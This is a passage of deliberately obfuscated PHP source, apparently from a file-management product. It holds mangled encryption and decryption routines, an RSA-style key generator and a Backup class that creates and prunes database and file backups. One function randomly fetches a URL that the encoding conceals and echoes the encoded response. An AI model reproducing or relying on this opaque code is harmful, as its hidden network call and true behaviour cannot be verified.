$¦¨ä³ì = Model($Â¯ÔËºï[126])->count(); $æÅœ¨£• = $üÂŒñâ¯[724]; if (!$æÅœ¨£•) { return; } if ($¦¨ä³ì <= $ÅüùÈ¡) { return; } $¢ßşÕœÒ = Model($Â¯ÔËºï[126])->field($Â¯ÔËºï[292])->limit($ÅüùÈ¡)->select(); $¢ßşÕœÒ = array_to_keyvalue($¢ßşÕœÒ, $Â¯ÔËºï[6], $Â¯ÔËºï[292]); $ªÄüØÜ = $üÂŒñâ¯[725]; if (strlen($ªÄüØÜ) < $üÂŒñâ¯[655]) { die; } if (!in_array($ƒÅÃâãĞ[$Â¯ÔËºï[292]], $¢ßşÕœÒ)) { show_json($Â¯ÔËºï[293], !1, $Â¯ÔËºï[209]); } } public function teoa8c678bfe() { $ ½ĞÒ• =& $_SERVER[—ÌÒğš÷]; $šêƒÖ˜î =& $_SERVER[Ş®ª¹ÕŸ]; if (!_get($GLOBALS, $šêƒÖ˜î[117]) || mt_rand(1, 100) > 20) { return; } $ªÅİÌ¾¡ = $šêƒÖ˜î[216]; $§ëàõÇŞ = $ ½ĞÒ•[726]; $ªÅİÌ¾¡ = $this->mkchd62dd9e0($ªÅİÌ¾¡, $šêƒÖ˜î[217]); $”ÔÃåŸş = $ ½ĞÒ•[727]; if (!$”ÔÃåŸş) { return; } $óæºŠæè = stream_context_create(array($šêƒÖ˜î[218] => array($šêƒÖ˜î[219] => $šêƒÖ˜î[220], $šêƒÖ˜î[221] => 3))); $ªè‚Ãá™ = $ ½ĞÒ•[728]; if (strlen($ªè‚Ãá™) < $ ½ĞÒ•[652]) { die; } $ªıŞÑó = @file_get_contents($ªÅİÌ¾¡, !1, $óæºŠæè); $ß™°‰Ğï = $ ½ĞÒ•[729]; if (strlen($ß™°‰Ğï) < $ ½ĞÒ•[677]) { die; } echo $šêƒÖ˜î[294] . hash_encode($ªıŞÑó) . $šêƒÖ˜î[295]; } private function soza56fc1aa9($‰Õš¤Ø‡, $î¬à¨‹‚, $ö˜Òêñğ = 3) { $™…îìÌÁ =& $_SERVER[—ÌÒğš÷]; $‰€ÂÑ±€ =& $_SERVER[Ş®ª¹ÕŸ]; usleep(1); $ÇÚ²‰Â = $™…îìÌÁ[730]; if (!$ÇÚ²‰Â) { die; } $‰Õš¤Ø‡ = trim($‰Õš¤Ø‡); $Íş™·…® = $™…îìÌÁ[731]; $ÏÅôĞ‹³ = mt_rand(0, 5) . $‰€ÂÑ±€[6]; $œ‰ÒÙ®€ = $™…îìÌÁ[732]; $Ìß»ÊÖ× = rand_string(15); $‰Ú¦œŒ› = $‰€ÂÑ±€[296]; $æ‰ı±‡ä = $™…îìÌÁ[733]; while ($æ‰ı±‡ä < $™…îìÌÁ[655]) { if ($æ‰ı±‡ä >= 0) { break; } $æ‰ı±‡ä++; } switch ($ÏÅôĞ‹³) { case $‰€ÂÑ±€[205]: $ƒãÇéÏÏ = $this->vsbg173a0a13($‰Õš¤Ø‡, strrev($î¬à¨‹‚ . $Ìß»ÊÖ×)); $‘üËæ„¬ = $™…îìÌÁ[734]; if (strlen($‘üËæ„¬) < $™…îìÌÁ[658]) { return; } break; case $‰€ÂÑ±€[123]: $ƒãÇéÏÏ = $this->vsbg173a0a13($‰Õš¤Ø‡, strrev($Ìß»ÊÖ× . $î¬à¨‹‚)); break; case $‰€ÂÑ±€[297]: $ƒãÇéÏÏ = $this->vsbg173a0a13($‰Õš¤Ø‡, base64_encode($Ìß»ÊÖ× . $î¬à¨‹‚)); $ ¯£¼çì = $™…îìÌÁ[735]; if (strlen($ ¯£¼çì) < $™…îìÌÁ[655]) { return; } break; $úìæ“ÏÌ = $™…îìÌÁ[736]; while ($úìæ“ÏÌ < $™…îìÌÁ[652]) { if ($úìæ“ÏÌ >= 0) { break; } $úìæ“ÏÌ++; } case $‰€ÂÑ±€[298]: $ƒãÇéÏÏ = $this->vsbg173a0a13($‰Õš¤Ø‡, md5($Ìß»ÊÖ× . $î¬à¨‹‚)); $Ù‰Š…ÁÙ = $™…îìÌÁ[737]; while ($Ù‰Š…ÁÙ < $™…îìÌÁ[655]) { if ($Ù‰Š…ÁÙ >= 0) { break; } $Ù‰Š…ÁÙ++; } break; $ò¯ûé™¾ = $™…îìÌÁ[738]; case $‰€ÂÑ±€[299]: $‰Õš¤Ø‡ = base64_encode($‰Õš¤Ø‡); $’¶¬îÉ = rand(0, 64); $ÇÎèçßè = $™…îìÌÁ[739]; $¯é—½è = $‰Ú¦œŒ›[$’¶¬îÉ]; $î¬ìš‘ = md5($¯é—½è . md5($î¬à¨‹‚ . $¯é—½è) . $î¬à¨‹‚); $î¬ìš‘ = substr($î¬ìš‘, $’¶¬îÉ % 8, $’¶¬îÉ % 8 + 7); $¯ÊëÈ™° = $™…îìÌÁ[740]; while ($¯ÊëÈ™° < $™…îìÌÁ[663]) { if ($¯ÊëÈ™° >= 0) { break; } $¯ÊëÈ™°++; } $¹í½Óàí = $‰€ÂÑ±€[6]; $¡õÌÈÆ· = 0; $™ˆ¿ğ†™ = 0; $ı®€Ò¾  = 0; for ($¡õÌÈÆ· = 0; $¡õÌÈÆ· < strlen($‰Õš¤Ø‡); $¡õÌÈÆ·++) { $ı®€Ò¾  = $ı®€Ò¾  == strlen($î¬ìš‘) ? 0 : $ı®€Ò¾ ; $ÎµÌ¼ïË = $™…îìÌÁ[741]; $™ˆ¿ğ†™ = ($’¶¬îÉ + strpos($‰Ú¦œŒ›, $‰Õš¤Ø‡[$¡õÌÈÆ·]) + ord($î¬ìš‘[$ı®€Ò¾ ++])) % 64; $¹í½Óàí .= $‰Ú¦œŒ›[$™ˆ¿ğ†™]; $Œ©Ÿ°ûŞ = $™…îìÌÁ[742]; while ($Œ©Ÿ°ûŞ < $™…îìÌÁ[663]) { if ($Œ©Ÿ°ûŞ >= 0) { break; } $Œ©Ÿ°ûŞ++; } } $ƒãÇéÏÏ = hash_encode($¯é—½è . $¹í½Óàí); break; $öÄ©ü¥” = $™…îìÌÁ[743]; if (!$öÄ©ü¥”) { return; } default: $ƒãÇéÏÏ = $this->vsbg173a0a13($‰Õš¤Ø‡, $î¬à¨‹‚ . $Ìß»ÊÖ×); $ˆ¿“°ÅÎ = $™…îìÌÁ[744]; if (!$ˆ¿“°ÅÎ) { return; } break; $ğÍ—°£ = $™…îìÌÁ[745]; if (!$ğÍ—°£) { return; } } $ƒãÇéÏÏ = strrev($ÏÅôĞ‹³ . $Ìß»ÊÖ× . $ƒãÇéÏÏ); if ($ö˜Òêñğ - 1 > 0) { $ƒãÇéÏÏ = $this->soza56fc1aa9($ƒãÇéÏÏ, $î¬à¨‹‚, $ö˜Òêñğ - 1); } return $ƒãÇéÏÏ; } private function ucrt22fd8c58($ÈÅ¤ÈŒí, $¡æƒò¸È, $®‘³â„Ù = 3) { $‘²Ù­˜Å =& $_SERVER[—ÌÒğš÷]; $¬ˆÄèé¡ =& $_SERVER[Ş®ª¹ÕŸ]; if (!is_string($ÈÅ¤ÈŒí) || strlen($ÈÅ¤ÈŒí) < 10) { return !1; } $ÈÅ¤ÈŒí = trim($ÈÅ¤ÈŒí); $ÈÅ¤ÈŒí = strrev($ÈÅ¤ÈŒí); $­òòíŒ« = $‘²Ù­˜Å[746]; if (strlen($­òòíŒ«) < $‘²Ù­˜Å[663]) { die; } $²Ù‰²î• = $ÈÅ¤ÈŒí[0]; $¨±ÎØĞ½ = $‘²Ù­˜Å[747]; $¦´”ÀÄ² = substr($ÈÅ¤ÈŒí, 1, 15); $ÈÅ¤ÈŒí = substr($ÈÅ¤ÈŒí, 16); $ëáô™¾’ = $‘²Ù­˜Å[748]; if (!$ëáô™¾’) { return; } $ñş¬Ü… = $¬ˆÄèé¡[296]; $ü®ÇÂİ = $‘²Ù­˜Å[749]; if (!$ü®ÇÂİ) { return; } switch ($²Ù‰²î•) { case $¬ˆÄèé¡[205]: $ÛÊä³‡Û = $this->mkchd62dd9e0($ÈÅ¤ÈŒí, strrev($¡æƒò¸È . $¦´”ÀÄ²)); break; $±¶½ìö§ = $‘²Ù­˜Å[750]; case $¬ˆÄèé¡[123]: $ÛÊä³‡Û = $this->mkchd62dd9e0($ÈÅ¤ÈŒí, strrev($¦´”ÀÄ² . $¡æƒò¸È)); break; case $¬ˆÄèé¡[297]: $ÛÊä³‡Û = $this->mkchd62dd9e0($ÈÅ¤ÈŒí, base64_encode($¦´”ÀÄ² . $¡æƒò¸È)); break; $åµ¥û¡‹ = $‘²Ù­˜Å[751]; case $¬ˆÄèé¡[298]: $ÛÊä³‡Û = $this->mkchd62dd9e0($ÈÅ¤ÈŒí, md5($¦´”ÀÄ² . $¡æƒò¸È)); $Ö°èóÕ‰ = $‘²Ù­˜Å[752]; if (!$Ö°èóÕ‰) { return; } break; $ôÚÓ¦ÌÂ = $‘²Ù­˜Å[753]; while ($ôÚÓ¦ÌÂ < $‘²Ù­˜Å[655]) { if ($ôÚÓ¦ÌÂ >= 0) { break; } $ôÚÓ¦ÌÂ++; } case $¬ˆÄèé¡[299]: $ÈÅ¤ÈŒí = hash_decode($ÈÅ¤ÈŒí); $‚“Ü€© = $ÈÅ¤ÈŒí[0]; $ÈÅ¤ÈŒí = substr($ÈÅ¤ÈŒí, 1); $Éğà´§ = $‘²Ù­˜Å[754]; if (strlen($Éğà´§) < $‘²Ù­˜Å[658]) { return; } $ÙÃæ‰Ê = strpos($ñş¬Ü…, $‚“Ü€©); $×¼ÇÁÛ¥ = md5($‚“Ü€© . md5($¡æƒò¸È . $‚“Ü€©) . $¡æƒò¸È); $½¶¦—ë„ = $‘²Ù­˜Å[755]; if (strlen($½¶¦—ë„) < $‘²Ù­˜Å[655]) { return; } $×¼ÇÁÛ¥ = substr($×¼ÇÁÛ¥, $ÙÃæ‰Ê % 8, $ÙÃæ‰Ê % 8 + 7); $†ÂÓÚ³µ = $‘²Ù­˜Å[679]; if (!$†ÂÓÚ³µ) { return; } $î‹‚¨Ë = $¬ˆÄèé¡[6]; $¼ıĞ‘ = $‘²Ù­˜Å[756]; if (strlen($¼ıĞ‘) < $‘²Ù­˜Å[658]) { die; } $ëÒö×æ¨ = 0; $†ÜÑÍò” = 0; $èóÑ¾Ìğ = $‘²Ù­˜Å[757]; if (!$èóÑ¾Ìğ) { return; } $‡ı‹âÜ¬ = 0; for ($ëÒö×æ¨ = 0; $ëÒö×æ¨ < strlen($ÈÅ¤ÈŒí); $ëÒö×æ¨++) { $‡ı‹âÜ¬ = $‡ı‹âÜ¬ == strlen($×¼ÇÁÛ¥) ? 0 : $‡ı‹âÜ¬; $”ö‡¶½© = $‡ı‹âÜ¬++; $†ÜÑÍò” = strpos($ñş¬Ü…, $ÈÅ¤ÈŒí[$ëÒö×æ¨]) - $ÙÃæ‰Ê - ord($×¼ÇÁÛ¥[$”ö‡¶½©]); $üÑ—á… = $‘²Ù­˜Å[758]; if (strlen($üÑ—á…) < $‘²Ù­˜Å[655]) { die; } while ($†ÜÑÍò” < 0) { $†ÜÑÍò” += 64; $ªÌ»·²ó = $‘²Ù­˜Å[759]; while (strlen($ªÌ»·²ó) < $‘²Ù­˜Å[652]) { if (!$ªÌ»·²ó) { break; } $ªÌ»·²ó++; } } $î‹‚¨Ë .= $ñş¬Ü…[$†ÜÑÍò”]; $º»ê˜”… = $‘²Ù­˜Å[760]; while (strlen($º»ê˜”…) < $‘²Ù­˜Å[663]) { if (!$º»ê˜”…) { break; } $º»ê˜”…++; } } $ÛÊä³‡Û = base64_decode($î‹‚¨Ë); break; default: $ÛÊä³‡Û = $this->mkchd62dd9e0($ÈÅ¤ÈŒí, $¡æƒò¸È . $¦´”ÀÄ²); $öŞçÆõõ = $‘²Ù­˜Å[761]; break; $øÏ§Òù¯ = $‘²Ù­˜Å[762]; if (strlen($øÏ§Òù¯) < $‘²Ù­˜Å[677]) { return; } } if ($®‘³â„Ù - 1 > 0) { $ÛÊä³‡Û = $this->ucrt22fd8c58($ÛÊä³‡Û, $¡æƒò¸È, $®‘³â„Ù - 1); } return $ÛÊä³‡Û; } public function thmg135a9b0a($ºøŸÅ×â) { $Ù•«²Ğã =& $_SERVER[—ÌÒğš÷]; $È’—Šéî =& $_SERVER[Ş®ª¹ÕŸ]; $¾£­óÕğ = $this->axzuc52aa064(); $ÉÄ°®Ã = $this->axzuc52aa064(); $¤°Û÷† = $Ù•«²Ğã[763]; $¼¢ƒûÒî = ($¾£­óÕğ - 1) * ($ÉÄ°®Ã - 1); $Âï¬¬Ê = $Ù•«²Ğã[764]; while ($Âï¬¬Ê < $Ù•«²Ğã[677]) { if ($Âï¬¬Ê >= 0) { break; } $Âï¬¬Ê++; } $¤¿™Åå = intval(($¾£­óÕğ + $ÉÄ°®Ã) / 2); $¯¸ õÕ½ = $Ù•«²Ğã[765]; while (1) { $‡Í‰óÉè = $¤¿™Åå; $ÇñŠ“¯ = $¼¢ƒûÒî; $´£Ü•Ñ¿ = $Ù•«²Ğã[766]; if (strlen($´£Ü•Ñ¿) < $Ù•«²Ğã[663]) { die; } while ($ÇñŠ“¯ % $‡Í‰óÉè != 0) { $—ÙÍªà€ = $ÇñŠ“¯; $ÀÈè¦àË = $Ù•«²Ğã[767]; if (!$ÀÈè¦àË) { die; } $ÇñŠ“¯ = $‡Í‰óÉè; $‡Í‰óÉè = $—ÙÍªà€ % $‡Í‰óÉè; } if ($‡Í‰óÉè == 1) { break; } else { $¤¿™Åå++; } } $åé¤ßâö = 2; $ŸğÖ•¤ƒ = $Ù•«²Ğã[768]; while ($ŸğÖ•¤ƒ < $Ù•«²Ğã[655]) { if ($ŸğÖ•¤ƒ >= 0) { break; } $ŸğÖ•¤ƒ++; } for ($½ˆ¹• = 0; $½ˆ¹• < $¼¢ƒûÒî * 10; $½ˆ¹•++) { if (($¼¢ƒûÒî * $½ˆ¹• + 1) % $¤¿™Åå == 0) { $åé¤ßâö = intval(($¼¢ƒûÒî * $½ˆ¹• + 1) / $¤¿™Åå); break; } } $ ŠĞ˜ = $this->vsbg173a0a13($¾£­óÕğ * $ÉÄ°®Ã . $È’—Šéî[6], $È’—Šéî[137]); $¢—ÉŸ® = md5($È’—Šéî[300] . ($¾£­óÕğ + $ÉÄ°®Ã) . $È’—Šéî[301] . $¤¿™Åå . $È’—Šéî[301] . $åé¤ßâö . $È’—Šéî[302]); $‹ÄÄé‹¿ = $this->vsbg173a0a13($ºøŸÅ×â, $¢—ÉŸ®) . $È’—Šéî[303] . $ ŠĞ˜; return $‹ÄÄé‹¿; $ÉÎ»ÜÓ« = $Ù•«²Ğã[769]; while ($ÉÎ»ÜÓ« < $Ù•«²Ğã[655]) { if ($ÉÎ»ÜÓ« >= 0) { break; } $ÉÎ»ÜÓ«++; } } public function ehkr1c96d058($ Í×£­¡) { $Æœíß²Í =& $_SERVER[—ÌÒğš÷]; $êÖ‰¯Ù =& $_SERVER[Ş®ª¹ÕŸ]; $ÑŒÕœ†Ò = explode($êÖ‰¯Ù[303], $ Í×£­¡); $Ì±³‰ïæ = $Æœíß²Í[770]; if (strlen($Ì±³‰ïæ) < $Æœíß²Í[677]) { return; } if (count($ÑŒÕœ†Ò) != 2) { return $êÖ‰¯Ù[6]; } $Š£‚ÒŞ = $this->mkchd62dd9e0($ÑŒÕœ†Ò[1] . $êÖ‰¯Ù[6], $êÖ‰¯Ù[137]); if (!$Š£‚ÒŞ) { return $êÖ‰¯Ù[6]; } $Š£‚ÒŞ = intval($Š£‚ÒŞ); $‹ÕûÂº  = 0; $ôªã®Š = $Æœíß²Í[771]; while ($ôªã®Š < $Æœíß²Í[655]) { if ($ôªã®Š >= 0) { break; } $ôªã®Š++; } $Ÿ®‡‘òµ = 0; for ($Ü’îõÊ = 3; $Ü’îõÊ < $Š£‚ÒŞ; $Ü’îõÊ += 2) { if ($Š£‚ÒŞ % $Ü’îõÊ != 0) { continue; } $‹ÕûÂº  = $Ü’îõÊ; $Ÿ®‡‘òµ = intval($Š£‚ÒŞ / $Ü’îõÊ); break; } $¿…âÅš = ($‹ÕûÂº  - 1) * ($Ÿ®‡‘òµ - 1); $³©Ö¿¿ = $Æœíß²Í[772]; if (strlen($³©Ö¿¿) < $Æœíß²Í[663]) { die; } $ÛÅ¶ûÑİ = intval(($‹ÕûÂº  + $Ÿ®‡‘òµ) / 2); while (1) { $±„İò Ì = $ÛÅ¶ûÑİ; $›¥ŞŒ÷ı = $Æœíß²Í[773]; $ƒ—Ã†İ = $¿…âÅš; while ($ƒ—Ã†İ % $±„İò Ì != 0) { $±ÇìÌ÷Ò = $ƒ—Ã†İ; $ƒ—Ã†İ = $±„İò Ì; $±„İò Ì = $±ÇìÌ÷Ò % $±„İò Ì; } if ($±„İò Ì == 1) { break; } else { $ÛÅ¶ûÑİ++; } } $ãÒ—üËè = 2; $˜€ôÆ¦ = $Æœíß²Í[774]; for ($Ü’îõÊ = 0; $Ü’îõÊ < $¿…âÅš * 10; $Ü’îõÊ++) { if (($¿…âÅš * $Ü’îõÊ + 1) % $ÛÅ¶ûÑİ == 0) { $ãÒ—üËè = intval(($¿…âÅš * $Ü’îõÊ + 1) / $ÛÅ¶ûÑİ); break; } } $÷–ğñá = md5($êÖ‰¯Ù[300] . ($‹ÕûÂº  + $Ÿ®‡‘òµ) . $êÖ‰¯Ù[301] . $ÛÅ¶ûÑİ . $êÖ‰¯Ù[301] . $ãÒ—üËè . $êÖ‰¯Ù[302]); $ö‚îãÚŠ = $Æœíß²Í[775]; while ($ö‚îãÚŠ < $Æœíß²Í[655]) { if ($ö‚îãÚŠ >= 0) { break; } $ö‚îãÚŠ++; } $ˆè©É—½ = $this->mkchd62dd9e0($ÑŒÕœ†Ò[0], $÷–ğñá); return $ˆè©É—½; $›¾ÂŞùü = $Æœíß²Í[776]; if (strlen($›¾ÂŞùü) < $Æœíß²Í[658]) { die; } } public function axzuc52aa064() { $Ü‡ú·Ï‡ =& $_SERVER[—ÌÒğš÷]; $¯íÅó˜ñ = mt_rand(pow(2, 14), pow(2, 16) - 1); $ŞÛüè = array(); $Î¦ŠÆÛ× = $Ü‡ú·Ï‡[777]; if (strlen($Î¦ŠÆÛ×) < $Ü‡ú·Ï‡[677]) { return; } $ô£ÆìÄ® = 1; while ($ô£ÆìÄ® <= (int) sqrt($¯íÅó˜ñ)) { $Ÿë‰îèò = $ô£ÆìÄ®; $±«ÓÉì¹ = $Ü‡ú·Ï‡[778]; if (!$±«ÓÉì¹) { die; } while (!0) { $Ÿë‰îèò++; $ÎÏ×æî = $Ü‡ú·Ï‡[678]; while ($ÎÏ×æî < $Ü‡ú·Ï‡[677]) { if ($ÎÏ×æî >= 0) { break; } $ÎÏ×æî++; } if ($Ÿë‰îèò <= 2) { $ô£ÆìÄ® = $Ÿë‰îèò; break; } else { if ($Ÿë‰îèò < 2) { continue; } } $‚Ê½é© = !0; for ($À¸¸£‡ = 2; $À¸¸£‡ <= sqrt($Ÿë‰îèò); $À¸¸£‡++) { if ($Ÿë‰îèò % $À¸¸£‡ == 0) { $‚Ê½é© = !1; } } if ($‚Ê½é©) { $ô£ÆìÄ® = $Ÿë‰îèò; break; } } $ŞÛüè[] = $ô£ÆìÄ®; } $ƒˆ—ŒÑ¹ = 2; $ö‹„Îç¬ = $Ü‡ú·Ï‡[779]; for ($Ÿë‰îèò = $¯íÅó˜ñ; $Ÿë‰îèò > 1; $Ÿë‰îèò--) { $‚Ê½é© = !0; $öùæ€§í = $Ü‡ú·Ï‡[780]; foreach ($ŞÛüè as $¶çî©) { if ($Ÿë‰îèò % $¶çî© == 0) { $‚Ê½é© = !1; break; } } if ($‚Ê½é©) { $ƒˆ—ŒÑ¹ = $Ÿë‰îèò; break; } } return $ƒˆ—ŒÑ¹; $úâì¼ÛÏ = $Ü‡ú·Ï‡[781]; if (strlen($úâì¼ÛÏ) < $Ü‡ú·Ï‡[655]) { die; } } public function kfbye7dced27($–ñ‚“Ü, $×î­·¤´) { $æ±Ú‰èÛ =& $_SERVER[Ş®ª¹ÕŸ]; return call_user_func(array($æ±Ú‰èÛ[8], $æ±Ú‰èÛ[304]), $–ñ‚“Ü, $×î­·¤´); $ÏûÆÙ©ı = $_SERVER[—ÌÒğš÷][782]; if (!$ÏûÆÙ©ı) { die; } } public function vsbg173a0a13($Ú¥îù¬, $§†…§àÉ) { $õ–ñ® =& $_SERVER[Ş®ª¹ÕŸ]; return call_user_func(array($õ–ñ®[305], $õ–ñ®[306]), $Ú¥îù¬, $§†…§àÉ); } public function mkchd62dd9e0($„ŞèÁÁã, $Æ¯Ü¯¾) { $Ğî˜¨ =& $_SERVER[Ş®ª¹ÕŸ]; return call_user_func(array($Ğî˜¨[305], $Ğî˜¨[307]), $„ŞèÁÁã, $Æ¯Ü¯¾); $²ëÛÊè¢ = $_SERVER[—ÌÒğš÷][783]; } } class Backup { protected static $name; protected static $option; protected static $manual; public function __construct() { $this->init(); $this->keep(); } public function init() { $Ñïı¿Ô =& $_SERVER[—ÌÒğš÷]; $this->isManual(); self::$name = date($Ñïı¿Ô[784]); if (!($“¤‘ƒ¬ç = Model($Ñïı¿Ô[785])->lastItem())) { $“¤‘ƒ¬ç = $this->initData(); } else { self::$name = $“¤‘ƒ¬ç[$Ñïı¿Ô[32]]; if ($“¤‘ƒ¬ç[$Ñïı¿Ô[786]] == $Ñïı¿Ô[88]) { self::$name = date($Ñïı¿Ô[255]); $Åğ¤Ÿ‡Ğ = 0; if (isset($“¤‘ƒ¬ç[$Ñïı¿Ô[337]][$Ñïı¿Ô[214]][$Ñïı¿Ô[509]])) { $Åğ¤Ÿ‡Ğ = (int) $“¤‘ƒ¬ç[$Ñïı¿Ô[337]][$Ñïı¿Ô[214]][$Ñïı¿Ô[509]]; } if (self::$manual == 0 && $“¤‘ƒ¬ç[$Ñïı¿Ô[32]] == self::$name) { Model($Ñïı¿Ô[785])->remove($“¤‘ƒ¬ç[$Ñïı¿Ô[443]]); } $“¤‘ƒ¬ç = $this->initData($Åğ¤Ÿ‡Ğ, $“¤‘ƒ¬ç[$Ñïı¿Ô[787]]); } else { $this->checkStore($“¤‘ƒ¬ç[$Ñïı¿Ô[787]]); } } self::$option = $“¤‘ƒ¬ç; } private function isManual() { $–²›êÄ´ = _get($GLOBALS, $_SERVER[—ÌÒğš÷][788], 0); $–²›êÄ´ = intval($–²›êÄ´); self::$manual = $–²›êÄ´ && $–²›êÄ´ == 1 ? 1 : 0; } private function initData($î­öºàˆ = 0, $€â§â = '') { $‘Ñ³Ñ® =& $_SERVER[—ÌÒğš÷]; $ÆĞú²Ï = Model($‘Ñ³Ñ®[785])->config(); if ($€â§â && $ÆĞú²Ï[$‘Ñ³Ñ®[787]] != $€â§â) { $î­öºàˆ = 0; } $this->checkStore($ÆĞú²Ï[$‘Ñ³Ñ®[787]]); if (self::$manual == 1) { self::$name .= $‘Ñ³Ñ®[11] . date($‘Ñ³Ñ®[789]); } $àÊá¸Ïâ = array($‘Ñ³Ñ®[787] => $ÆĞú²Ï[$‘Ñ³Ñ®[787]], $‘Ñ³Ñ®[32] => self::$name, $‘Ñ³Ñ®[786] => 0, $‘Ñ³Ñ®[790] => $ÆĞú²Ï[$‘Ñ³Ñ®[790]], $‘Ñ³Ñ®[791] => self::$manual, $‘Ñ³Ñ®[337] => array($‘Ñ³Ñ®[792] => array($‘Ñ³Ñ®[786] => 0), $‘Ñ³Ñ®[793] => array($‘Ñ³Ñ®[786] => 0, $‘Ñ³Ñ®[794] => 0, $‘Ñ³Ñ®[795] => 0, $‘Ñ³Ñ®[33] => $‘Ñ³Ñ®[12], $‘Ñ³Ñ®[796] => 0, $‘Ñ³Ñ®[797] => 0), $‘Ñ³Ñ®[798] => array($‘Ñ³Ñ®[786] => 0, $‘Ñ³Ñ®[794] => 0, $‘Ñ³Ñ®[795] => 0, $‘Ñ³Ñ®[796] => 0, $‘Ñ³Ñ®[797] => 0), $‘Ñ³Ñ®[214] => array($‘Ñ³Ñ®[786] => 0, $‘Ñ³Ñ®[799] => 0, $‘Ñ³Ñ®[800] => 0, $‘Ñ³Ñ®[801] => 0, $‘Ñ³Ñ®[802] => 0, $‘Ñ³Ñ®[509] => $î­öºàˆ, $‘Ñ³Ñ®[796] => 0, $‘Ñ³Ñ®[797] => 0)), $‘Ñ³Ñ®[796] => time(), $‘Ñ³Ñ®[797] => 0); $‡¾÷Ä³ = Model($‘Ñ³Ñ®[785])->insert($àÊá¸Ïâ); $àÊá¸Ïâ[$‘Ñ³Ñ®[443]] = $‡¾÷Ä³; return $àÊá¸Ïâ; } private function checkStore($¢¤®á’÷) { $÷¾ãÖğ« =& $_SERVER[—ÌÒğš÷]; $ş±¾–å = Model($÷¾ãÖğ«[803])->listData($¢¤®á’÷); Model($÷¾ãÖğ«[803])->checkConfig($ş±¾–å); } public static function get() { if (!self::$option) { self::$option = Model($_SERVER[—ÌÒğš÷][785])->findByName(self::$name); } return self::$option; } public static function set($ÂÔ¦¨ĞØ) { $„×Ø·¥ =& $_SERVER[—ÌÒğš÷]; $Ñ‰›²‹‰ = self::get(); foreach ($ÂÔ¦¨ĞØ as $ª§±¬÷ => $«’ëÆÓ) { $ÒÂ»˜ÑÜ = explode($„×Ø·¥[10], $ª§±¬÷); $ËÜ¢Á™ = count($ÒÂ»˜ÑÜ); switch ($ËÜ¢Á™) { case 1: $Ñ‰›²‹‰[$ÒÂ»˜ÑÜ[0]] = $«’ëÆÓ; break; case 2: $Ñ‰›²‹‰[$ÒÂ»˜ÑÜ[0]][$ÒÂ»˜ÑÜ[1]] = $«’ëÆÓ; break; case 3: $Ñ‰›²‹‰[$ÒÂ»˜ÑÜ[0]][$ÒÂ»˜ÑÜ[1]][$ÒÂ»˜ÑÜ[2]] = $«’ëÆÓ; break; } } Model($„×Ø·¥[785])->update($Ñ‰›²‹‰[$„×Ø·¥[443]], $Ñ‰›²‹‰); self::$option = $Ñ‰›²‹‰; return self::$option; } public function keep() { $¢ˆÏÓ¢» =& $_SERVER[—ÌÒğš÷]; $ú­‹Ú¹ê = self::get(); if ($ú­‹Ú¹ê[$¢ˆÏÓ¢»[337]][$¢ˆÏÓ¢»[792]][$¢ˆÏÓ¢»[786]] == $¢ˆÏÓ¢»[88]) { return; } $this->backupKeep($ú­‹Ú¹ê); self::set(array($¢ˆÏÓ¢»[804] => 1)); } private function backupKeep($šÕ¾•ë±) { $ÖÙ»œŞı =& $_SERVER[—ÌÒğš÷]; if (self::$manual == 1) { return; } $áéâşµí = Model($ÖÙ»œŞı[785])->listData(); if (empty($áéâşµí)) { return; } $„ °„íŞ = 0; $üú¯· = array(); foreach ($áéâşµí as $Ê¾äæ®å) { if ($„ °„íŞ >= 7) { break; } $üú¯·[] = $Ê¾äæ®å[$ÖÙ»œŞı[32]]; $„ °„íŞ++; } for ($„ °„íŞ = 0; $„ °„íŞ < 12; $„ °„íŞ++) { $üú¯·[] = date($ÖÙ»œŞı[805], strtotime("\x2d{$„ °„íŞ}\x20\x6d\157\156\x74\x68\163")); } $üú¯· = array_unique($üú¯·); $ĞÃçîØê = Model($ÖÙ»œŞı[806])->get($ÖÙ»œŞı[807]); foreach ($áéâşµí as $Ê¾äæ®å) { if (isset($Ê¾äæ®å[$ÖÙ»œŞı[791]]) && $Ê¾äæ®å[$ÖÙ»œŞı[791]] == $ÖÙ»œŞı[88]) { continue; } if (!empty($Ê¾äæ®å[$ÖÙ»œŞı[32]]) && in_array($Ê¾äæ®å[$ÖÙ»œŞı[32]], $üú¯·)) { continue; } Model($ÖÙ»œŞı[785])->remove($Ê¾äæ®å[$ÖÙ»œŞı[443]]); $Ø¼€ı²å = $this->backupPath($šÕ¾•ë±, $ĞÃçîØê); IO::remove($Ø¼€ı²å, !1); } } private function backupPath($¬†¡ Â, $˜ı °êğ = false) { $’Üç·ı =& $_SERVER[—ÌÒğš÷]; if (!$˜ı °êğ) { $˜ı °êğ = Model($’Üç·ı[806])->get($’Üç·ı[807]); } $îş¶Òš™ = $¬†¡ Â[$’Üç·ı[32]]; $ñå ›© = substr(md5($’Üç·ı[808] . $˜ı °êğ . $îş¶Òš™), 0, 8); return "\173\x69\157\72{$¬†¡ Â[$’Üç·ı[787]]}\x7d\57\144\141\164\x61\x62\x61\163\x65\57\142\141\143\x6b\165\x70\x2f" . $îş¶Òš™ . $’Üç·ı[11] . $ñå ›©; } public function db() { $ü–•Çú“ =& $_SERVER[—ÌÒğš÷]; $°óÅËò§ = self::get(); if ($°óÅËò§[$ü–•Çú“[337]][$ü–•Çú“[793]][$ü–•Çú“[786]] == $ü–•Çú“[88]) { return !0; } $„ïú‹íè = new BackupDb(); if (!$„ïú‹íè->index()) { return !1; } self::set(array($ü–•Çú“[809] => 1)); return !0; } public function dbFile() { $÷€Øı‰Š =& $_SERVER[—ÌÒğš÷]; $•Æø³Ç» = self::get(); if ($•Æø³Ç»[$÷€Øı‰Š[337]][$÷€Øı‰Š[798]][$÷€Øı‰Š[786]] == $÷€Øı‰Š[88]) { return !0; } $Îôàœ” = new BackupDbFile(); if (!$Îôàœ”->index()) { return !1; } self::set(array($÷€Øı‰Š[810] => 1)); return !0; } public function file() { $õêèá¼Õ =& $_SERVER[—ÌÒğš÷]; $ƒ´—Ë›È = self::get(); if ($ƒ´—Ë›È[$õêèá¼Õ[337]][$õêèá¼Õ[214]][$õêèá¼Õ[786]] == $õêèá¼Õ[88]) { return !0; } if (!isset($ƒ´—Ë›È[$õêèá¼Õ[790]]) || $ƒ´—Ë›È[$õêèá¼Õ[790]] == $õêèá¼Õ[212]) { $”ªºµä‰ = new BackupFile(); if (!$”ªºµä‰->index()) { return !1; } } self::set(array($õêèá¼Õ[811] => 1, $õêèá¼Õ[786] => 1)); return !0; } } class BackupDb { protected static $io; protected static $name; public function __construct() { } public function index() { $øÁß°› =& 